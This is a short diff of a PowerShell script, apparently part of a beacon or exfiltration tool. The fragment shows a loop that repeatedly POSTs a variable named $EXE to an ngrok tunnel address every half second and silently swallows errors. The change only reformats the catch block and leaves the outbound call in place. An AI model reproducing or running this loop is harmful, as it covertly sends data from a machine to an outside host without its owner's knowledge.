@@ -53,10 +53,9 @@ while ($true)
         { 
             $Response = Invoke-WebRequest -Method Post -URI https://404611374.ngrok.io -Body $EXE -UseBasicParsing 
         }
-        catch
-        {
+        catch{
+        	$null
         }
-		}else{ 	
-		}
+    }
 sleep 0.5
 }
